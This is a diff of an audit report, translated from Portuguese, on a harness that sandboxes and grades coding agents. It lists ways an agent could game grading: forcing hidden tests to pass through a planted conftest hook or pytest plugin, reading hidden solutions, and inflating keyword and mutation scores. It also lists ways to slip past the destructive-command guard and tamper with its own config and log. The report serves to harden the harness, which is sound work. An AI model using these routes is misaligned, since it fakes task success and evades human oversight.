-  - Quem diz são `eval/README.md` ("rode sempre pelo container", acrescentado pela E7), `sandbox/README.md` e a seção 8 do plano.
-  - O `agents/codex-local/README.md` ainda diz "Fora do container (E6, no WSL) … `CODEX_LOCAL_SANDBOX=workspace-write`". Isso ficou desatualizado depois que a E7 passou a rodar antes da E6.
-  - Nenhum código impede o modo autonomous no host. O `agents/measure-preamble.sh` chama o `run.sh` direto, e o `agents/README.md` manda rodá-lo assim (I3).
-- `--setting-sources user` faz o eval ignorar os hooks e as permissões do repositório testado. O lançador interativo não usa essa opção, de propósito: no uso diário o projeto é do usuário.
+- **Where it appears.** `--permission-mode bypassPermissions` only exists in `claude-local/run.sh`, when `AGENT_PROFILE=autonomous`, after `source env.sh`, which exports `CLAUDE_CONFIG_DIR="$AGENT_HOME/claude"`.
+  - The `settings.*.json` files do not set `defaultMode: bypassPermissions`. The interactive one uses `acceptEdits`.
+  - The `claude-local` launcher forwards `"$@"`. Whoever types `--dangerously-skip-permissions` enters bypass, but still with the isolated directory.
+  - There is no path to bypass that uses `~/.claude`. **PASS** on this point.
+- **"It must run in the E7 container".**
+  - Neither `agents/README.md` nor `agents/claude-local/README.md` say so. What they say is that "the container is the real barrier".
+  - Who says it are `eval/README.md` ("always run through the container", added by E7), `sandbox/README.md` and section 8 of the plan.
+  - `agents/codex-local/README.md` still says "Outside the container (E6, in WSL) … `CODEX_LOCAL_SANDBOX=workspace-write`". This became outdated after E7 started running before E6.
+  - No code prevents autonomous mode on the host. `agents/measure-preamble.sh` calls `run.sh` directly, and `agents/README.md` tells people to run it that way (I3).
+- `--setting-sources user` makes the eval ignore the hooks and permissions of the repository under test. The interactive launcher does not use this option, on purpose: in daily use the project belongs to the user.
 
-## 6. `eval/`: tarefas e prompts: PASS
+## 6. `eval/`: tasks and prompts: PASS
 
-| Tarefa | Prompt | Verificação | Observação |
+| Task | Prompt | Check | Note |
 |---|---|---|---|
-| T1 | Pedido realista; não cita gabarito | `codigo_inalterado` (src, test), ≥ 300 palavras, gabarito de 10 fatos (nota manual) | Gabarito específico e verificável |
-| T2 | Relato de usuário com reprodução | 6 testes ocultos (original + ramos, dialetos, UPDATE, `immutable=False`) + suíte | Não depende da forma da correção; o pedido de "um teste" não é conferido (M7) |
-| T3 | Especificação completa | 25 pares pt/en + strict + frase + negativos | Compara com o inglês, não com a solução: bom |
-| T4 | Pede testes de `duration.ts` em arquivo definido | módulo inalterado + 12 mutantes ≥ 60% + suíte | Ver seção 7 |
-| T5 | Sintoma realista; nomeia os testes que falham | hidden (repetibilidade, strict×casual, várias referências) + suíte + relatório | Armadilha boa: tornar `addDuration` imutável quebra outro teste. Causa raiz por palavras-chave (I6) |
-| T6 | Especificação detalhada + plano | 21 testes ocultos + plano (nota manual) | Um teste exige algo que a especificação não diz (I5) |
-| T7 | Revisão do diff não commitado | 10 testes ocultos (regressão + recurso) + suíte | "Inclusive em código que já existia" é uma dica leve, aceitável num pedido de revisão |
-| S1–S3 | Curtos e realistas | hidden/suíte; S3 com 6 mutantes | S2 confere a remoção das cópias pelo texto do código, o que é aceitável |
+| T1 | Realistic request; does not cite the answer key | `codigo_inalterado` (src, test), ≥ 300 words, 10-fact answer key (manual grade) | Specific and verifiable answer key |
+| T2 | User report with reproduction | 6 hidden tests (original + branches, dialects, UPDATE, `immutable=False`) + suite | Does not depend on the shape of the fix; the request for "a test" is not checked (M7) |
+| T3 | Complete specification | 25 pt/en pairs + strict + sentence + negatives | Compares with English, not with the solution: good |
+| T4 | Asks for tests of `duration.ts` in a defined file | unchanged module + 12 mutants ≥ 60% + suite | See section 7 |
+| T5 | Realistic symptom; names the failing tests | hidden (repeatability, strict×casual, several references) + suite + report | Good trap: making `addDuration` immutable breaks another test. Root cause by keywords (I6) |
+| T6 | Detailed specification + plan | 21 hidden tests + plan (manual grade) | One test requires something the specification does not say (I5) |
+| T7 | Review of the uncommitted diff | 10 hidden tests (regression + feature) + suite | "Including in code that already existed" is a light hint, acceptable in a review request |
+| S1–S3 | Short and realistic | hidden/suite; S3 with 6 mutants | S2 checks the removal of the copies by the code text, which is acceptable |
 
-- **Fora do workdir.**
-  - `hidden/*` é copiado só durante a verificação e removido logo depois, num `finally`.
-  - Se o agente tiver criado um arquivo com o mesmo nome, ele é guardado como `.agent-orig` e devolvido no fim.
-  - As soluções só entram pelo `validate.sh` e pelo `fake-oracle`.
-  - O workdir é um commit único sem o histórico do upstream. Os `AGENTS.md`/`CLAUDE.md` do upstream são apagados.
-  - Não existe `AGENTS.md`/`CLAUDE.md`/`QWEN.md` em `~`, `~/.cache`, `~/.cache/local-agentic` nem em `/`. Conferi só a existência.
-- **Ressalva.** Sem `EVAL_WRAPPER`, o agente consegue ler `eval/tasks/*/hidden` e as `solution.patch` no disco. Também consegue ler os workdirs de execuções anteriores, inclusive de outros agentes: com `EVAL_CLEANUP=deps`, as fontes ficam em `~/.cache/local-agentic/eval-work/<run>/<h>/<tarefa>/repo`. O README avisa e a E7 resolve.
-- **Editar ou apagar testes não ajuda.**
-  - `baseline_tests` restaura os testes que o agente alterou antes de rodar a suíte.
-  - `restore_protected_config` restaura ou apaga a configuração listada em `repo.json`.
-  - O `baseline` vem do `run.sh` (`--baseline`), não do repositório do agente.
+- **Outside the workdir.**
+  - `hidden/*` is copied only during verification and removed right after, in a `finally`.
+  - If the agent created a file with the same name, it is saved as `.agent-orig` and returned at the end.
+  - The solutions only enter through `validate.sh` and the `fake-oracle`.
+  - The workdir is a single commit without the upstream history. The upstream's `AGENTS.md`/`CLAUDE.md` are deleted.
+  - There is no `AGENTS.md`/`CLAUDE.md`/`QWEN.md` in `~`, `~/.cache`, `~/.cache/local-agentic` or `/`. I checked existence only.
+- **Caveat.** Without `EVAL_WRAPPER`, the agent can read `eval/tasks/*/hidden` and the `solution.patch` files on disk. It can also read the workdirs of earlier runs, including other agents': with `EVAL_CLEANUP=deps`, the sources stay in `~/.cache/local-agentic/eval-work/<run>/<h>/<task>/repo`. The README warns about it and E7 solves it.
+- **Editing or deleting tests does not help.**
+  - `baseline_tests` restores the tests the agent changed before running the suite.
+  - `restore_protected_config` restores or deletes the configuration listed in `repo.json`.
+  - The `baseline` comes from `run.sh` (`--baseline`), not from the agent's repository.
 
-## 7. `eval/`: verificações e mutantes: PARCIAL
+## 7. `eval/`: checks and mutants: PARTIAL
 
-- **Mutantes.**
-  - T4: 12 mudanças de uma linha, cada uma com efeito observável: abreviação de ano/ms, fator do trimestre, frações, sinal da hora, desvio de um minuto, `reverseDuration` que não inverte, mês como 30 dias, `round`→`floor`.
-  - S3: 6 mutantes: `all`→`any`, `None`→`False`, escape de aspas, aspas padrão, `AS` trocado, precedência de `alias_quote_char`.
-  - Nenhum é equivalente ao código original.
-  - Segundo o README e o resultado `e2e-oracle`, a solução de referência mata 12 de 12 e 6 de 6.
-- **Inflação da nota de mutação (I7).**
-  - `check_mutation` conta como "testes do agente" **qualquer** arquivo de teste novo ou alterado.
-  - No chrono, `test/en/en_time_units_ago.test.ts`, `…_later` e `…_within` (36, 36 e 47 `testSingleCase`) passam por `addDuration`/`reverseDuration`.
-  - Um agente que mexa num deles, mesmo de passagem, ganha esses testes na conta de mutantes mortos sem escrever bons testes para `duration.ts`.
-  - O campo `exclude_tests` existe, mas não é usado.
-- **T5 é aprovado por palavras-chave (I6).**
-  - Os grupos são `["parsedDurationCache","cache","memo"]` e `["addDuration","muta",…,"shared"]`.
-  - "muta" casa com "imutável" e "cache" é genérico. Um relatório que diga "problema de cache em estado compartilhado" passa.
-  - O `status` sai `pass` automaticamente. O README diz que "o task.json marca a tarefa para conferência manual", mas a marca é só texto em `notes`: nenhum código lê esse campo, e o `summarize.py` não lista o T5 como pendente.
-  - O critério do plano ("causa raiz correta no relatório") não é verificado de fato.
-- **T6 exige algo fora da especificação (I5).**
-  - `test_columns_branches_are_independent` espera `columns("a")` seguido de `.columns("b")` → `("a","b")`, ou seja, que as chamadas acumulem.
-  - O `task.md` diz só que "`.columns("a", "b")` define a lista de colunas". Uma implementação que substitui a lista é válida pela especificação e falha no teste.
-  - O teste mistura imutabilidade com acumulação.
-- **Configuração de testes desprotegida (I1).** A lista `protected_config` do pypika cobre `pyproject.toml`, `setup.cfg`, `pytest.ini`, `tox.ini`, `conftest.py` e `pypika/tests/conftest.py`. Ficam de fora:
-  - `pypika/conftest.py` e qualquer outro `conftest.py` no caminho dos testes ocultos (`pypika/tests/test_hidden_*.py`). Um hook `pytest_runtest_makereport` ali força "passou".
-  - `pytest.toml`, `.pytest.toml` e `.pytest.ini`. O pytest fixado é o 9.2.0, e o `_pytest/config/findpaths.py` do wheel em cache confirma: `CONFIG_LOADERS_BY_NAME = {"pytest.toml", ".pytest.toml", "pytest.ini", ".pytest.ini", "pyproject.toml", "tox.ini", "setup.cfg"}`, nessa ordem de precedência. Um `addopts = "-p <plugin do repo>"` entra.
-  - `.venv/` e `node_modules/`, que estão em `.git/info/exclude`. O agente pode alterar o pytest, o jest ou o ts-jest, ou plantar um `.pth`/`sitecustomize`. Nada é reinstalado nem conferido antes das verificações.
-  - No chrono, um `jest.config.cjs`/`.json` novo só quebraria o jest (conflito com o `"jest"` do `package.json`). O ts-jest não usa babel. Ali o risco é menor.
-  - O plano registra, no harness-bench, casos de agente que leu o avaliador. Por isso o reforço vale a pena, embora o `agent.patch` mostre qualquer arquivo novo.
+- **Mutants.**
+  - T4: 12 one-line changes, each with an observable effect: year/ms abbreviation, quarter factor, fractions, hour sign, one-minute offset, `reverseDuration` that does not reverse, month as 30 days, `round`→`floor`.
+  - S3: 6 mutants: `all`→`any`, `None`→`False`, quote escape, default quotes, swapped `AS`, `alias_quote_char` precedence.
+  - None is equivalent to the original code.
+  - According to the README and the `e2e-oracle` result, the reference solution kills 12 of 12 and 6 of 6.
+- **Inflation of the mutation score (I7).**
+  - `check_mutation` counts **any** new or changed test file as "the agent's tests".
+  - In chrono, `test/en/en_time_units_ago.test.ts`, `…_later` and `…_within` (36, 36 and 47 `testSingleCase`) go through `addDuration`/`reverseDuration`.
+  - An agent that touches one of them, even in passing, gets those tests counted as killed mutants without writing good tests for `duration.ts`.
+  - The `exclude_tests` field exists, but is not used.
+- **T5 is approved by keywords (I6).**
+  - The groups are `["parsedDurationCache","cache","memo"]` and `["addDuration","muta",…,"shared"]`.
+  - "muta" matches "imutável" (immutable) and "cache" is generic. A report saying "cache problem in shared state" passes.
+  - The `status` comes out `pass` automatically. The README says that "task.json marks the task for manual review", but the mark is just text in `notes`: no code reads that field, and `summarize.py` does not list T5 as pending.
+  - The plan's criterion ("correct root cause in the report") is not actually verified.
+- **T6 requires something outside the specification (I5).**
+  - `test_columns_branches_are_independent` expects `columns("a")` followed by `.columns("b")` → `("a","b")`, that is, that the calls accumulate.
+  - `task.md` only says that "`.columns("a", "b")` sets the list of columns". An implementation that replaces the list is valid by the specification and fails the test.
+  - The test mixes immutability with accumulation.
+- **Unprotected test configuration (I1).** The pypika `protected_config` list covers `pyproject.toml`, `setup.cfg`, `pytest.ini`, `tox.ini`, `conftest.py` and `pypika/tests/conftest.py`. Left out:
+  - `pypika/conftest.py` and any other `conftest.py` in the path of the hidden tests (`pypika/tests/test_hidden_*.py`). A `pytest_runtest_makereport` hook there forces "passed".
+  - `pytest.toml`, `.pytest.toml` and `.pytest.ini`. The pinned pytest is 9.2.0, and `_pytest/config/findpaths.py` in the cached wheel confirms: `CONFIG_LOADERS_BY_NAME = {"pytest.toml", ".pytest.toml", "pytest.ini", ".pytest.ini", "pyproject.toml", "tox.ini", "setup.cfg"}`, in that precedence order. An `addopts = "-p <plugin from the repo>"` gets in.
+  - `.venv/` and `node_modules/`, which are in `.git/info/exclude`. The agent can alter pytest, jest or ts-jest, or plant a `.pth`/`sitecustomize`. Nothing is reinstalled or checked before the checks.
+  - In chrono, a new `jest.config.cjs`/`.json` would only break jest (conflict with the `"jest"` entry in `package.json`). ts-jest does not use babel. The risk there is smaller.
+  - The plan records, in the harness-bench, cases of an agent that read the grader. So the hardening is worthwhile, although `agent.patch` shows any new file.
 
-## 8. `eval/`: runner, esquema e agregação: PASS
+## 8. `eval/`: runner, schema and aggregation: PASS
 
-Li `run.sh` (em `1f8e59f`), `matrix.sh`, `validate.sh`, `summarize.py`, `grade.py`, `lib/common.sh`, `lib/check.py`, `lib/result.py`, `lib/metrics.py`, `lib/sampler.py` e `harnesses/fake-oracle/run.sh`.
+I read `run.sh` (at `1f8e59f`), `matrix.sh`, `validate.sh`, `summarize.py`, `grade.py`, `lib/common.sh`, `lib/check.py`, `lib/result.py`, `lib/metrics.py`, `lib/sampler.py` and `harnesses/fake-oracle/run.sh`.
 
-- **Correto:**
-  - `run-id` e `harness` validados por regex.
-  - Lock com `flock`.
-  - Setup do zero, com commit-base de hash fixo.
-  - `start_ref` por `git stash create`, que inclui o diff pendente do T7.
-  - `agent.patch` com arquivos novos, por índice temporário, antes das verificações.
-  - `--baseline` explícito.
-  - `timeout -k 30`, com 124 e 137 registrados como `timed_out`.
-  - Métricas do servidor com detecção de contador reiniciado.
-  - `result.json` com o esquema documentado. O `grade.py` só aprova se `auto_checks_pass` for verdadeiro.
-- **Conferido sem executar:** os `result.json` existentes em `eval/runs/e2e-oracle` e `e2e-negative` batem com o README. São 10 execuções:
-  - 8 `pass` e 2 aguardando nota, que viraram `pass` depois do `grade.py`;
-  - `noop` deu `fail`;
-  - `timeout` deu `timed_out: true` e `fail`.
-- **Menores:**
-  - A tabela da Meta 1 do `summarize.py` não desconta `interventions` e não mede "nenhuma ação destrutiva", dois critérios do plano (M5).
-  - Execuções com `error` entram no denominador dos 2/3, mas não na taxa de sucesso (M5).
-  - Uma exceção numa verificação obrigatória vira `pass: False` com `infra_error`, e portanto `status: fail`. O `return 2` do `check.py` nunca é alcançado, e o `result.py` não usa `infra_errors`. Erro de infraestrutura é contado como falha do agente (M6).
+- **Correct:**
+  - `run-id` and `harness` validated by regex.
+  - Lock with `flock`.
+  - Setup from scratch, with a base commit of fixed hash.
+  - `start_ref` via `git stash create`, which includes T7's pending diff.
+  - `agent.patch` with new files, through a temporary index, before the checks.
+  - Explicit `--baseline`.
+  - `timeout -k 30`, with 124 and 137 recorded as `timed_out`.
+  - Server metrics with detection of a reset counter.
+  - `result.json` with the documented schema. `grade.py` only approves if `auto_checks_pass` is true.
+- **Checked without running:** the existing `result.json` files in `eval/runs/e2e-oracle` and `e2e-negative` match the README. There are 10 runs:
+  - 8 `pass` and 2 awaiting a grade, which became `pass` after `grade.py`;
+  - `noop` gave `fail`;
+  - `timeout` gave `timed_out: true` and `fail`.
+- **Minor:**
+  - `summarize.py`'s Goal 1 table does not discount `interventions` and does not measure "no destructive action", two criteria of the plan (M5).
+  - Runs with `error` enter the denominator of the 2/3, but not the success rate (M5).
+  - An exception in a mandatory check becomes `pass: False` with `infra_error`, and therefore `status: fail`. `check.py`'s `return 2` is never reached, and `result.py` does not use `infra_errors`. An infrastructure error is counted as an agent failure (M6).
 
 ---
 
-## Problemas
+## Problems
 
-| # | Severidade | Problema | Correção sugerida |
+| # | Severity | Problem | Suggested fix |
 |---|---|---|---|
-| B1 | **bloqueante** | `agents/install.sh` roda `<agente> --version` com a HOME real e sem as variáveis de isolamento. Pode criar ou alterar `~/.qwen`, `~/.config/opencode`, `~/.local/share/opencode`, `~/.pi`, `~/.codex` e `~/.claude.json`. A E7 já registrou que o `--version` grava na HOME. | Rodar com `HOME="$(mktemp -d)"` e `XDG_*` limpos, como faz o `sandbox/install-agents.sh`, ou ler a versão do `package.json` instalado. |
-| I1 | importante | A proteção da configuração de testes tem lacunas: `conftest.py` fora da lista, `pytest.toml`/`.pytest.toml`/`.pytest.ini` (lidos pelo pytest 9.2), `.venv`/`node_modules` alteráveis. Um agente pode forçar os testes ocultos a passar. | Em `protected_config`, aceitar padrões (`**/conftest.py`, `pytest.toml`, `.pytest.toml`, `.pytest.ini`, `jest.config.*`). Antes das verificações, recriar `.venv`/`node_modules` do cache, sem rede, ou rodar com cópias limpas. |
-| I2 | importante | A guarda deixa passar sintaxe comum: `if/then`, `for/do`, heredoc ou here-string para `bash`, `cd "$VAR"`/`pushd`, `xargs rm -rf`, `send-pack`/`subtree push`/alias, opções de `nice`/`time`/`command`/`env -S`. O README promete "`git push` em qualquer forma". | Tratar palavras-chave do shell (`if then elif else fi for while until do done case esac { } !`) como separadores. Avaliar o corpo do heredoc ou here-string quando o leitor for shell ou interpretador. Com `cwd` desconhecido, negar `rm -r/-f` relativo. Negar `rm -r/-f` vindo de `xargs`/`find -exec`. Cobrir `send-pack`, `subtree push` e `-c alias.*`. Tratar opções com argumento nos wrappers. Atualizar a lista de limites no README. |
-| I3 | importante | Nada impede o modo autonomous no host (Claude em bypass, Qwen em yolo, Pi sem permissões, Codex em `danger-full-access`). O `measure-preamble.sh` chama o `run.sh` direto. Os READMEs de `agents/` e de `claude-local/` não dizem "só no container", e o do Codex ainda fala em "E6 no WSL". | No `run.sh`, recusar `AGENT_PROFILE=autonomous` fora do container, a menos que `AGENT_ALLOW_HOST=1`. O container pode marcar `AGENT_BOX=1`, ou o script pode conferir `/.dockerenv`. Atualizar os três READMEs e o uso do `measure-preamble.sh`. |
-| I4 | importante | No host, o agente herda variáveis da sessão pai: `CLAUDECODE`, `CLAUDE_CODE_SESSION_ID`, `CLAUDE_CODE_MESSAGING_SOCKET/TOKEN`, `CLAUDE_CODE_BRIDGE_SESSION_ID`, `CLAUDE_EFFORT`… e `OPENAI_*` no Qwen e no Pi. | Em `run_agent` e nos lançadores, executar com `env -i` e uma lista de variáveis permitidas, como faz o `run-in-box.sh`. No mínimo, apagar `CLAUDECODE` e `CLAUDE_CODE_*`/`CLAUDE_*` que não foram definidas de propósito, e `OPENAI_*` no Qwen e no Pi. |
-| I5 | importante | O teste oculto `test_columns_branches_are_independent` (T6) exige que `.columns()` acumule entre chamadas, o que não está na especificação. Uma solução válida reprova. | Reescrever o teste sem depender de acumular ou substituir (ramos a partir de uma base sem colunas), ou especificar no `task.md` que as chamadas acumulam, como no `create_table`. |
-| I6 | importante | A causa raiz do T5 é aprovada por palavras-chave amplas ("cache", "muta" casa com "imutável") e o resultado vira `pass` sem revisão. O critério do plano não é verificado. | Fazer do relatório um item com nota (`pending_grading`) ou acrescentar `needs_review: true`, que o `summarize.py` liste. Exigir termos específicos ao mesmo tempo (`parseDuration`/`parsedDurationCache` **e** `addDuration`). |
-| I7 | importante | Mutação (T4, S3): qualquer arquivo de teste já existente que o agente altere entra na conta. No T4, os testes de unidades de tempo em inglês já exercitam `duration.ts` e inflam a nota. | Contar só arquivos que não existem no baseline (ou o caminho pedido no prompt). Outra opção: descontar os mutantes que a versão do baseline desses arquivos já mata. |
-| M1 | menor | O `latest` do Qwen Code virou 0.26.4. O README diz que 0.26.3 é o `latest`. | Atualizar o texto. A versão fixada continua válida. |
-| M2 | menor | O `install.sh` confere a integridade publicada no registro, não o hash do arquivo baixado, e não usa lockfile (dependências transitivas variam). | Reaproveitar o método do `sandbox/install-agents.sh` (`npm pack` + SHA-512 do arquivo). Opcional: `npm-shrinkwrap` por agente. |
-| M3 | menor | O agente pode alterar a própria config em `<log-dir>/home` (hooks, `deny`) e o `guard.log` durante a execução. A segunda camada e a métrica `guard_blocks` podem ser desligadas ou adulteradas. | Gerar a config numa pasta só de leitura no container, ou conferir o hash da config e do `guard.log` depois da execução. |
-| M4 | menor | Na extensão do Pi, `write`/`edit` usam `path.resolve` sem `realpath`: um link dentro do projeto que aponta para fora passa. | Usar `fs.realpathSync` no diretório pai do alvo. |
-| M5 | menor | A Meta 1 do `summarize.py` ignora `interventions` e ações destrutivas. `error` entra nos 2/3, mas não na taxa. | Contar como sucesso só `pass` com `interventions == 0`. Mostrar a mediana de intervenções e os bloqueios da guarda. Tratar `error` à parte. |
-| M6 | menor | Erro de infraestrutura nas verificações vira `fail` do agente. | Propagar `infra_errors` para `status: error` no `result.py`, ou separar exceção de infraestrutura de falha do teste. |
-| M7 | menor | O T2/S1 pedem "um teste" e o T6 pede documentação no README, mas nada disso é conferido. | Acrescentar uma verificação não obrigatória (arquivo de teste novo ou alterado, README alterado) para registrar. |
-| M8 | menor | `tool_call_errors` não é comparável entre agentes: no Codex, comando com saída diferente de 0 conta como erro. | Na tabela da E6, mostrar a coluna por agente com a definição, ou normalizar. |
-| M9 | menor | `agents/README.md` "Edição: livre dentro do projeto" vale só para as ferramentas de edição: no autonomous o shell escreve em qualquer lugar, e `rm` simples, `mv`, `truncate` e `>` fora do projeto passam pela guarda. | Dizer isso explicitamente na tabela de permissões. |
+| B1 | **blocking** | `agents/install.sh` runs `<agent> --version` with the real HOME and without the isolation variables. It can create or change `~/.qwen`, `~/.config/opencode`, `~/.local/share/opencode`, `~/.pi`, `~/.codex` and `~/.claude.json`. E7 already recorded that `--version` writes to HOME. | Run with `HOME="$(mktemp -d)"` and clean `XDG_*`, as `sandbox/install-agents.sh` does, or read the version from the installed `package.json`. |
+| I1 | important | The test-configuration protection has gaps: `conftest.py` outside the list, `pytest.toml`/`.pytest.toml`/`.pytest.ini` (read by pytest 9.2), `.venv`/`node_modules` alterable. An agent can force the hidden tests to pass. | In `protected_config`, accept patterns (`**/conftest.py`, `pytest.toml`, `.pytest.toml`, `.pytest.ini`, `jest.config.*`). Before the checks, recreate `.venv`/`node_modules` from the cache, without network, or run with clean copies. |
+| I2 | important | The guard lets common syntax through: `if/then`, `for/do`, heredoc or here-string to `bash`, `cd "$VAR"`/`pushd`, `xargs rm -rf`, `send-pack`/`subtree push`/alias, options of `nice`/`time`/`command`/`env -S`. The README promises "`git push` in any form". | Treat shell keywords (`if then elif else fi for while until do done case esac { } !`) as separators. Evaluate the body of a heredoc or here-string when the reader is a shell or interpreter. With an unknown `cwd`, deny relative `rm -r/-f`. Deny `rm -r/-f` coming from `xargs`/`find -exec`. Cover `send-pack`, `subtree push` and `-c alias.*`. Handle options with arguments in wrappers. Update the list of limits in the README. |
+| I3 | important | Nothing prevents autonomous mode on the host (Claude in bypass, Qwen in yolo, Pi without permissions, Codex in `danger-full-access`). `measure-preamble.sh` calls `run.sh` directly. The READMEs of `agents/` and `claude-local/` do not say "container only", and the Codex one still talks about "E6 in WSL". | In `run.sh`, refuse `AGENT_PROFILE=autonomous` outside the container, unless `AGENT_ALLOW_HOST=1`. The container can set `AGENT_BOX=1`, or the script can check `/.dockerenv`. Update the three READMEs and the use of `measure-preamble.sh`. |
+| I4 | important | On the host, the agent inherits variables from the parent session: `CLAUDECODE`, `CLAUDE_CODE_SESSION_ID`, `CLAUDE_CODE_MESSAGING_SOCKET/TOKEN`, `CLAUDE_CODE_BRIDGE_SESSION_ID`, `CLAUDE_EFFORT`… and `OPENAI_*` in Qwen and Pi. | In `run_agent` and in the launchers, run with `env -i` and an allowlist of variables, as `run-in-box.sh` does. At minimum, clear `CLAUDECODE` and any `CLAUDE_CODE_*`/`CLAUDE_*` not set on purpose, and `OPENAI_*` in Qwen and Pi. |
+| I5 | important | The hidden test `test_columns_branches_are_independent` (T6) requires `.columns()` to accumulate between calls, which is not in the specification. A valid solution fails. | Rewrite the test so it does not depend on accumulating or replacing (branches from a base without columns), or specify in `task.md` that the calls accumulate, as in `create_table`. |
+| I6 | important | T5's root cause is approved by broad keywords ("cache", "muta" matches "imutável") and the result becomes `pass` without review. The plan's criterion is not verified. | Make the report a graded item (`pending_grading`) or add `needs_review: true`, which `summarize.py` lists. Require specific terms at the same time (`parseDuration`/`parsedDurationCache` **and** `addDuration`). |
+| I7 | important | Mutation (T4, S3): any already-existing test file that the agent changes enters the count. In T4, the English time-unit tests already exercise `duration.ts` and inflate the score. | Count only files that do not exist in the baseline (or the path requested in the prompt). Another option: discount the mutants that the baseline version of those files already kills. |
+| M1 | minor | Qwen Code's `latest` became 0.26.4. The README says 0.26.3 is the `latest`. | Update the text. The pinned version remains valid. |
+| M2 | minor | `install.sh` checks the integrity published in the registry, not the hash of the downloaded file, and does not use a lockfile (transitive dependencies vary). | Reuse the method from `sandbox/install-agents.sh` (`npm pack` + SHA-512 of the file). Optional: `npm-shrinkwrap` per agent. |
+| M3 | minor | The agent can change its own config in `<log-dir>/home` (hooks, `deny`) and `guard.log` during the run. The second layer and the `guard_blocks` metric can be turned off or tampered with. | Generate the config in a read-only folder in the container, or check the hash of the config and of `guard.log` after the run. |
+| M4 | minor | In Pi's extension, `write`/`edit` use `path.resolve` without `realpath`: a link inside the project that points outside passes. | Use `fs.realpathSync` on the target's parent directory. |
+| M5 | minor | `summarize.py`'s Goal 1 ignores `interventions` and destructive actions. `error` enters the 2/3 but not the rate. | Count as success only `pass` with `interventions == 0`. Show the median of interventions and the guard blocks. Treat `error` separately. |
+| M6 | minor | An infrastructure error in the checks becomes an agent `fail`. | Propagate `infra_errors` to `status: error` in `result.py`, or separate an infrastructure exception from a test failure. |
+| M7 | minor | T2/S1 ask for "a test" and T6 asks for documentation in the README, but none of that is checked. | Add a non-mandatory check (new or changed test file, changed README) to record it. |
+| M8 | minor | `tool_call_errors` is not comparable between agents: in Codex, a command with an exit code other than 0 counts as an error. | In the E6 table, show the column per agent with the definition, or normalize. |
+| M9 | minor | `agents/README.md` "Editing: free inside the project" holds only for the editing tools: in autonomous the shell writes anywhere, and plain `rm`, `mv`, `truncate` and `>` outside the project pass through the guard. | Say this explicitly in the permissions table. |
 
-## Só dá para verificar em execução (depois da E4)
+## Can only be verified at runtime (after E4)
 
-1. **Isolamento real.** Instalar com o B1 corrigido. Depois rodar cada agente uma vez, de preferência no container ou com uma HOME descartável no host. Conferir que nada foi criado ou alterado em `~/.claude`, `~/.claude.json`, `~/.codex`, `~/.gemini`, `~/.qwen`, `~/.config/opencode`, `~/.local/share/opencode`, `~/.cache/opencode`, `~/.pi`, `~/.agents` e `~/.cache/claude-cli-nodejs`. Usar `find -newer <marcador>`. A data de `~/.claude` não serve, porque a sessão do orquestrador mexe nela.
-2. **Pastas de skills fora da config isolada.** Ver se Codex, Pi ou Qwen leem `~/.agents/skills` (existe nesta máquina) mesmo com `CODEX_HOME`/`PI_CODING_AGENT_DIR`/`QWEN_HOME`. Isso afeta os lançadores interativos no host.
-3. **Config aceita pela versão fixada.**
-   - Qwen: `$version: 4`, `goals`, `tools.disabled`, `hooks` com `name`.
-   - Codex: `--profile autonomous` lido de `$CODEX_HOME/autonomous.config.toml`. Se não for lido, o eval roda com outra aprovação ou outro sandbox.
-   - Pi: `apiKey: "$LOCAL_LLM_API_KEY"` resolvida e `-e guard.ts` carregada em `--mode json`.
-   - OpenCode: a flag `--auto` existe na 1.19.5, e o plugin carrega sem baixar `@opencode-ai/plugin` (sem rede no container).
-   - Claude: `--exclude-dynamic-system-prompt-sections` e `--setting-sources user`.
-4. **A guarda dispara em cada agente.**
-   - Pedir `git push` e `rm -rf ../x` e conferir no `guard.log`.
-   - Codex: o `tool_input.command` chega como **string**. Se vier como lista, o `guard.py` faz `str(lista)` e libera tudo.
-   - Qwen: o hook roda no YOLO.
-   - Claude: `deny` + hook valem no bypass, como usuário não root no container.
-   - Repetir os casos da seção 4 depois da correção do I2.
-5. **Claude local aninhado.** Com `CLAUDECODE` herdado no host, ver se o `claude -p` recusa ou se liga à sessão pai. No container, conferir que a variável não chega.
+1. **Real isolation.** Install with B1 fixed. Then run each agent once, preferably in the container or with a disposable HOME on the host. Check that nothing was created or changed in `~/.claude`, `~/.claude.json`, `~/.codex`, `~/.gemini`, `~/.qwen`, `~/.config/opencode`, `~/.local/share/opencode`, `~/.cache/opencode`, `~/.pi`, `~/.agents` and `~/.cache/claude-cli-nodejs`. Use `find -newer <marker>`. The date of `~/.claude` is no use, because the orchestrator's session touches it.
+2. **Skills folders outside the isolated config.** See whether Codex, Pi or Qwen read `~/.agents/skills` (it exists on this machine) even with `CODEX_HOME`/`PI_CODING_AGENT_DIR`/`QWEN_HOME`. This affects the interactive launchers on the host.
+3. **Config accepted by the pinned version.**
+   - Qwen: `$version: 4`, `goals`, `tools.disabled`, `hooks` with `name`.
+   - Codex: `--profile autonomous` read from `$CODEX_HOME/autonomous.config.toml`. If it is not read, the eval runs with another approval or sandbox.
+   - Pi: `apiKey: "$LOCAL_LLM_API_KEY"` resolved and `-e guard.ts` loaded in `--mode json`.
+   - OpenCode: the `--auto` flag exists in 1.19.5, and the plugin loads without downloading `@opencode-ai/plugin` (no network in the container).
+   - Claude: `--exclude-dynamic-system-prompt-sections` and `--setting-sources user`.
+4. **The guard fires in each agent.**
+   - Ask for `git push` and `rm -rf ../x` and check in `guard.log`.
+   - Codex: `tool_input.command` arrives as a **string**. If it comes as a list, `guard.py` does `str(list)` and lets everything through.
+   - Qwen: the hook runs in YOLO.
+   - Claude: `deny` + hook hold in bypass, as a non-root user in the container.
+   - Repeat the cases from section 4 after the I2 fix.
+5. **Nested local Claude.** With `CLAUDECODE` inherited on the host, see whether `claude -p` refuses or attaches to the parent session. In the container, check that the variable does not arrive.
 6. **Endpoints.**
-   - `/v1/messages`: thinking, temperatura vinda de `CLAUDE_CODE_EXTRA_BODY`, `count_tokens`.
-   - `/v1/responses`: itens `reasoning` com `content`, `apply_patch` pelo shell.
-   - Amostragem chegando ao servidor, conferida com `--verbose`.
-   - Número de requisições por turno.
-7. **`agent-metrics.json` contra o `events.jsonl`.** Em especial, ver se o Claude Code repete blocos entre eventos `assistant` da mesma mensagem: isso contaria chamadas em dobro e acusaria laços falsos.
-8. **Primeira execução real do eval pelo `EVAL_WRAPPER`.**
-   - Rodar S1–S3 com 1 agente.
-   - Confirmar que `hidden/` e `solution.patch` não estão visíveis no container.
-   - Medir o tempo das verificações e conferir o `TZ`.
-   - Ver se o agente consegue reescrever a própria config em `<log-dir>/home` (M3).
